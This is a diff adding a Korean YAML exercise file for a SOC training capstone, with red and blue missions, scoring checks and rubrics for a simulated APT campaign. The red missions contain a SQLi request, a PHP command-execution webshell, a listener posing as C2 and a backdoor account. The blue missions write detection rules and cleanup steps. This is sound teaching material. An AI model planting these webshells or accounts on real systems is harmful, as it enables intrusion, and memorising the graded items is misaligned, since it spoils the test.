@@ -1,0 +1,333 @@
+id: "soc-adv-w15"
+category: "soc-adv"
+title: "[SOC고급 W15] 종합 실전 — APT 캠페인 대응 + SOC 성숙도 재평가(수료)"
+difficulty: "hard"
+time_limit: 3600
+battle_type: "1v1"
+description: |
+  SOC 고급과정 **수료 시험**. 15주간 배운 전 역량을 하나의 사건에 동원한다. 공격자가 APT 다단계 캠페인
+  (침투 → 웹쉘 → C2 → 지속성)을 펼치고, 관제팀(너)은 실시간 탐지·IOC 통합관리·위협 헌팅·KPI 측정·**SOC-CMM
+  재평가**(W1 baseline 대비 성장 정량화)까지 종합 수행한다.
+
+  ▸ 이야기
+    공격자가 SQLi 로 침투해 웹쉘을 심고, C2 채널과 백도어 계정으로 지속성을 확보한다. 관제팀은 ① 공격 탐지
+    (Suricata), ② IOC 통합 관리(CDB+Wazuh), ③ 다중 발판 헌팅·제거, ④ KPI 측정과 교차분석, ⑤ SOC-CMM
+    재평가와 수료 보고서로 15주를 매듭짓는다.
+
+  ▸ 모드
+    • solo : 한 학생이 APT 공격 후 종합 관제. 대상 = 본인 인프라.
+    • duel : Red 가 상대(Blue) 인프라에 APT 캠페인을, Blue 는 자기 인프라에서 종합 대응.
+
+  ▸ 공격자 위치(중요)
+    Red 미션은 **attacker-ext(SSH 2203)** 외부 침입자 기준. Red 채점은 **대상 인프라의 흔적(WAF audit / 웹쉘·
+    C2 포트·계정)** 으로 한다.
+
+  ▸ 이번 주차 전용 마커
+    공격 태그 **`sa15r1-<본인id>`**, 웹쉘 **`/var/www/html/.sa15shell.php`**, C2 포트 **54015**, 계정 **`soca15`**,
+    Suricata 룰 **sid 9615151**, Wazuh 룰 **id 102151**, IOC CDB **`/var/ossec/etc/lists/soc-adv-w15-ioc`**. 종료 시 cleanup.
+
+red_missions:
+  - order: 1
+    assess_target: opponent
+    target_vm: web
+    points: 18
+    instruction: |
+      ## 🎯 RED-1 [APT 1·2단계] — 침투 → 웹쉘
+
+      ### 상황
+      APT 캠페인의 초기 단계다. 태그 `sa15r1-<본인id>` SQLi 로 침투하고 웹쉘 **`/var/www/html/.sa15shell.php`** 로
+      실행 발판을 확보한다.
+
+      ### 할 일 (attacker-ext → 발판 후)
+      예시(id=kim):
+      ```bash
+      curl -s -A "sqlmap/1.7" -H "Host: dvwa.6v6.lab" \
+        "http://<대상_공개IP>/vulnerabilities/sqli/?id=sa15r1-kim%27%20UNION%20SELECT%201--+&Submit=Submit"
+      cat > /var/www/html/.sa15shell.php <<'PHP'
+      <?php /* sa15 */ system($_POST['c'] ?? ''); ?>
+      PHP
+      ```
+
+      ### 채점 방법
+      대상 WAF audit 에 태그 `sa15r1` 가 남고, 웹쉘 `/var/www/html/.sa15shell.php` 가 있는지로 채점.
+
+      ### 합격 기준
+      대상 WAF audit 에 `sa15r1` 탐지가 있거나 웹쉘 파일이 존재한다.
+    hint: "태그(sa15r1) SQLi + 웹쉘 /var/www/html/.sa15shell.php. 채점: log_contains modsec sa15r1 + file_exists 웹쉘."
+    verify:
+      type: "log_contains"
+      expect: "sa15r1"
+      checks:
+        - { id: "red-1-1", type: "log_contains", target: "web",
+            params: { log: "modsec", pattern: "sa15r1", since_sec: 1800 } }
+        - { id: "red-1-2", type: "file_exists", target: "web", params: { path: "/var/www/html/.sa15shell.php" } }
+      semantic:
+        intent: "APT 1·2단계 — Initial Access(T1190)+Execution(T1505.003 웹쉘). 대상 WAF audit 태그(sa15r1) + 웹쉘."
+        success_criteria:
+          - "WAF audit 에 sa15r1 탐지 또는 웹쉘 파일"
+          - "침투→실행 단계 연결 서술"
+        acceptable_methods:
+          - "attacker-ext 태그 SQLi + 웹쉘"
+        negative_signs:
+          - "태그/웹쉘 모두 부재"
+
+  - order: 2
+    assess_target: opponent
+    target_vm: web
+    points: 17
+    instruction: |
+      ## 🎯 RED-2 [APT 3·4단계] — C2 + 지속성
+
+      ### 상황
+      APT 후기 단계다. C2 채널 **포트 54015** 와 백도어 계정 **`soca15`** 로 지휘통제·지속성을 확보한다.
+
+      ### 할 일
+      ```bash
+      nohup ncat -lk 54015 >/dev/null 2>&1 &    # 또는 nc -lk 54015 / python3 -m http.server 54015
+      sudo useradd -m -s /bin/bash soca15
+      ```
+
+      ### 채점 방법
+      대상 호스트에 포트 54015 가 listening 이거나 `/etc/passwd` 에 `soca15` 가 있는지로 채점.
+
+      ### 합격 기준
+      포트 54015 listening 또는 `/etc/passwd` 에 `soca15`.
+    hint: "C2 포트 54015 + useradd soca15. 채점: port_listening 54015 + file_contains passwd soca15."
+    verify:
+      type: "port_listening"
+      expect: "54015"
+      checks:
+        - { id: "red-2-1", type: "port_listening", target: "web", params: { port: 54015 } }
+        - { id: "red-2-2", type: "file_contains", target: "web",
+            params: { path: "/etc/passwd", pattern: "soca15" } }
+      semantic:
+        intent: "APT 3·4단계 — C2(T1571) + Persistence(T1136). 지휘통제·지속성 확보."
+        success_criteria:
+          - "포트 54015 listening 또는 계정 soca15"
+          - "C2/지속성 기법 서술"
+        acceptable_methods:
+          - "리스너 + useradd"
+        negative_signs:
+          - "흔적 미생성"
+
+blue_missions:
+  - order: 1
+    assess_target: self
+    target_vm: ips
+    points: 16
+    instruction: |
+      ## 🛡️ BLUE-1 [실시간 탐지] — APT 웹공격 Suricata 룰 (sid 9615151)
+
+      ### 상황
+      수료 시뮬레이션의 탐지 단계다. RED-1 의 웹공격을 잡는 Suricata 룰(**sid 9615151**)을 배포한다.
+
+      ### 할 일
+      ```
+      alert http any any -> any any (msg:"SOCADV-W15 capstone SQLi UNION"; flow:to_server; http.uri; content:"UNION"; nocase; content:"SELECT"; nocase; sid:9615151; rev:1;)
+      ```
+      ```bash
+      sudo suricatasc -c reload-rules
+      ```
+
+      ### 채점 방법
+      ips 의 `local.rules` 에 sid 9615151 룰이 있는지로 확인.
+
+      ### 합격 기준
+      `local.rules` 에 APT 웹공격을 보는 sid 9615151 룰이 존재한다.
+    hint: "APT 웹공격 Suricata 룰(sid 9615151, UNION SELECT) → reload. 채점: file_contains local.rules 9615151."
+    verify:
+      type: "file_contains"
+      expect: "9615151"
+      checks:
+        - { id: "blue-1-1", type: "file_contains", target: "ips",
+            params: { path: "/etc/suricata/rules/local.rules", pattern: "9615151" } }
+      semantic:
+        intent: "수료 탐지 — APT 웹공격 Suricata 룰. 실시간 모니터링 역량 증명."
+        success_criteria:
+          - "local.rules 에 sid 9615151"
+          - "APT 캠페인의 어느 단계를 탐지하는지 명시"
+        acceptable_methods:
+          - "Suricata 룰 작성 + reload"
+        negative_signs:
+          - "패턴 부정확 / 문법 오류"
+
+  - order: 2
+    assess_target: self
+    target_vm: siem
+    points: 15
+    instruction: |
+      ## 🛡️ BLUE-2 [IOC 통합 관리] — CDB + Wazuh 동시 운영화 (id 102151)
+
+      ### 상황
+      오늘 대응에서 수집한 IOC(태그/포트/계정)를 **CDB 리스트와 Wazuh 룰에 동시 배포**해 통합 관리한다. IOC 를
+      CDB **`/var/ossec/etc/lists/soc-adv-w15-ioc`** 에 등록하고, 그 IOC 를 격상하는 Wazuh 룰(**id 102151**)을 만든다.
+
+      ### 할 일
+      ```bash
+      sudo tee /var/ossec/etc/lists/soc-adv-w15-ioc >/dev/null <<'CDB'
+      sa15r1:apt-campaign-tag
+      soca15:apt-backdoor-account
+      CDB
+      ```
+      ```xml
+      <group name="edu,apt,">
+        <rule id="102151" level="13">
+          <if_group>edu</if_group>
+          <match>sa15</match>
+          <description>SOCADV-W15 - APT campaign IOC escalation</description>
+        </rule>
+      </group>
+      ```
+      ```bash
+      sudo /var/ossec/bin/wazuh-control restart
+      ```
+
+      ### 채점 방법
+      `local_rules.xml` 에 id 102151 룰이 있는지로 확인(+ CDB 동시 배포는 보고로 검증).
+
+      ### 합격 기준
+      `local_rules.xml` 에 APT IOC 를 격상하는 id 102151 룰이 존재한다.
+    hint: "IOC 를 CDB(soc-adv-w15-ioc) + Wazuh 룰(id 102151) 동시 배포 → restart. 채점: file_contains local_rules.xml 102151."
+    verify:
+      type: "file_contains"
+      expect: "102151"
+      checks:
+        - { id: "blue-2-1", type: "file_contains", target: "siem",
+            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "102151" } }
+      semantic:
+        intent: "IOC 통합 관리 — CDB + Wazuh 룰 동시 배포로 APT IOC 운영화. 수집 IOC 의 즉시 탐지 환류."
+        success_criteria:
+          - "local_rules.xml 에 rule id 102151"
+          - "CDB 리스트 + Wazuh 룰 동시 배포 서술"
+          - "오늘 수집한 IOC(태그/계정)의 출처 명시"
+        acceptable_methods:
+          - "CDB + Wazuh 룰 + restart"
+        negative_signs:
+          - "IOC 근거 없음 / XML 오류"
+
+  - order: 3
+    assess_target: self
+    target_vm: web
+    points: 15
+    instruction: |
+      ## 🛡️ BLUE-3 [통합 헌팅] — 다중 발판 발견 후 제거
+
+      ### 상황
+      APT 는 여러 발판을 남긴다. 웹쉘(`/var/www/html/.sa15shell.php`), C2(포트 54015), 백도어 계정(`soca15`)을
+      전수 헌팅해 모두 찾아 제거한다(하나라도 남으면 재침투).
+
+      ### 할 일
+      ```bash
+      ls -al /var/www/html/.sa15shell.php 2>/dev/null
+      sudo ss -tlnp | grep 54015 ; sudo getent passwd | grep soca15
+      ```
+      보고서에 "전수 헌팅 → 발견 목록 → 제거 → 재점검(음성 확인)" 으로 적는다.
+
+      ### 채점 방법
+      대상 호스트에서 웹쉘 또는 C2(포트 54015)가 헌팅되는지로 채점(전수 발견이 핵심).
+
+      ### 합격 기준
+      웹쉘 `/var/www/html/.sa15shell.php` 또는 포트 54015 listening 을 식별한다(전수 제거 보고).
+    hint: "웹쉘+C2(54015)+계정(soca15) 전수 헌팅 → 제거 → 재점검. 채점: file_exists 웹쉘 + port_listening 54015(전수 발견 핵심)."
+    verify:
+      type: "file_exists"
+      expect: "/var/www/html/.sa15shell.php"
+      checks:
+        - { id: "blue-3-1", type: "file_exists", target: "web", params: { path: "/var/www/html/.sa15shell.php" } }
+        - { id: "blue-3-2", type: "port_listening", target: "web", params: { port: 54015 } }
+      semantic:
+        intent: "통합 헌팅 — APT 다중 발판(웹쉘/C2/계정) 전수 발견 + 제거 + 재점검. 하나라도 남으면 재침투. 전수조사 핵심."
+        success_criteria:
+          - "웹쉘 또는 C2 포트 식별(+계정 점검)"
+          - "전수 헌팅 목록 + 가설 + 음성 결과 포함 보고"
+          - "발견→제거→재점검 단계"
+        acceptable_methods:
+          - "ls/ss/getent/Wazuh 로 전수 발견 — 도구보다 전수조사 핵심"
+        negative_signs:
+          - "일부 발판 누락 / 재점검 없음"
+
+  - order: 4
+    assess_target: self
+    target_vm: siem
+    points: 18
+    instruction: |
+      ## 🛡️ BLUE-4 [KPI·교차분석] — MTTD/MTTR + Suricata×Wazuh
+
+      ### 상황
+      운영 성과를 정량화한다. 오늘 시뮬레이션의 **MTTD(탐지 시간)/MTTR(대응 시간)/처리 알림 수/인시던트 수** 를
+      계산하고, Suricata 알림과 Wazuh 호스트 로그를 교차 분석해 APT 캠페인의 전모를 재구성한다.
+
+      ### 할 일
+      보고서에:
+      - KPI: MTTD/MTTR/처리 알림 수/인시던트 수
+      - 교차분석: Suricata(네트워크) × Wazuh(호스트)로 APT 단계 재구성
+      ```bash
+      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
+        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
+      ```
+
+      ### 채점 방법
+      본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 KPI/교차분석으로 채점.
+      > 참고: 실재 증거(Suricata IDS rule **86601** 등)를 인용하면 점수가 오른다.
+
+      ### 합격 기준
+      본인 SIEM 에 최근 경보가 있다(+ KPI·Suricata×Wazuh 교차분석은 제출로 검증).
+    hint: "KPI(MTTD/MTTR/알림수/인시던트수) + Suricata×Wazuh 교차분석으로 APT 재구성. 실증 증거(86601) 인용. 채점: wazuh_alert + 제출."
+    verify:
+      type: "wazuh_alert"
+      expect: "alert"
+      checks:
+        - { id: "blue-4-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
+      semantic:
+        intent: "수료 KPI·교차분석 — MTTD/MTTR/알림수 + Suricata×Wazuh 교차로 APT 재구성. 분석형 — 실재 증거 인용 시 점수 상승."
+        success_criteria:
+          - "최근 경보 수집 확인"
+          - "KPI(MTTD/MTTR/처리 알림 수/인시던트 수) 산출"
+          - "Suricata×Wazuh 교차분석 + APT 단계 재구성"
+        acceptable_methods:
+          - "KPI 계산 + 교차분석"
+        negative_signs:
+          - "KPI/교차분석 누락"
+
+  - order: 5
+    assess_target: self
+    target_vm: siem
+    points: 19
+    instruction: |
+      ## 🛡️ BLUE-5 [수료] — SOC-CMM 재평가 + 최종 종합 보고 + Cleanup
+
+      ### 상황
+      15주의 매듭이다. **W1 의 SOC-CMM baseline 과 비교**해 5개 도메인의 성장을 정량화하고, 15주 전체 학습 성과·
+      구축한 탐지 체계·향후 발전 계획을 담은 **최종 종합 보고서**를 작성한다. R/B/P 회고 후 실습 아티팩트를
+      **일괄 cleanup** 하며 수료한다.
+
+      ### 할 일
+      - SOC-CMM 재평가(W1 점수 vs W15 점수, 도메인별 성장) + 최종 종합 보고서(성과/탐지 체계/발전 계획)
+      - R/B/P 회고 + cleanup:
+      ```bash
+      sudo rm -f /var/www/html/.sa15shell.php /var/ossec/etc/lists/soc-adv-w15-ioc; sudo pkill -f 'ncat -lk 54015' 2>/dev/null; sudo userdel -r soca15 2>/dev/null
+      sudo sed -i '/9615151/d' /etc/suricata/rules/local.rules && sudo suricatasc -c reload-rules
+      # local_rules.xml 에서 102151 블록 제거 후 wazuh-control restart
+      ```
+
+      ### 채점 방법
+      본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 SOC-CMM 재평가/최종 보고서/회고/cleanup 으로 채점.
+
+      ### 합격 기준
+      본인 SIEM 에 최근 경보가 있다(+ SOC-CMM 재평가·최종 보고서·회고·cleanup 은 제출로 검증).
+    hint: "W1 대비 SOC-CMM 재평가(5도메인 성장) + 최종 종합 보고서(성과/탐지체계/발전계획) + R/B/P 회고 + 웹쉘/CDB/54015/soca15/9615151/102151 일괄 cleanup. 채점: wazuh_alert + 제출."
+    verify:
+      type: "wazuh_alert"
+      expect: "alert"
+      checks:
+        - { id: "blue-5-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
+      semantic:
+        intent: "수료 종합 — W1 대비 SOC-CMM 재평가(성장 정량화) + 최종 보고서 + R/B/P 회고 + cleanup. 15주 SOC 고급과정의 매듭."
+        success_criteria:
+          - "최근 경보 수집 확인"
+          - "W1 baseline 대비 SOC-CMM 5도메인 성장 정량화"
+          - "최종 종합 보고서(성과/탐지 체계/발전 계획) + R/B/P 회고 + 아티팩트 일괄 cleanup"
+        acceptable_methods:
+          - "CMM 재평가 표 + 최종 보고서 + 회고 + cleanup"
+        negative_signs:
+          - "W1 비교 없음 / cleanup 미완"
